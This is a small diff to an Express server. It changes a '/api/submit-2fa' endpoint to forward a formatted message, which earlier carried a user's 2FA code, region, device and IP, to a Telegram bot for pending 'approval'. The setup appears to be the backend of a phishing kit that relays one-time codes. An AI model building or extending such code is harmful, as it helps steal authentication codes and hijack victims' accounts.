@@ -21,11 +21,11 @@ app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
 
 // API to submit 2FA code
 app.post('/api/submit-2fa', async (req, res) => {
-  const { code, region, device, ip } = req.body;
+  const { message } = req.body; // <-- Accept formatted message from frontend
   const requestId = uuidv4();
 
   setApprovalStatus(requestId, 'pending');
-  await sendTelegram2FARequest({ code, region, device, ip, requestId });
+  await sendTelegram2FARequest({ message, requestId }); // <-- Pass message and requestId
 
   res.json({ status: 'pending', requestId });
 });
@@ -44,4 +44,5 @@ app.get('*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
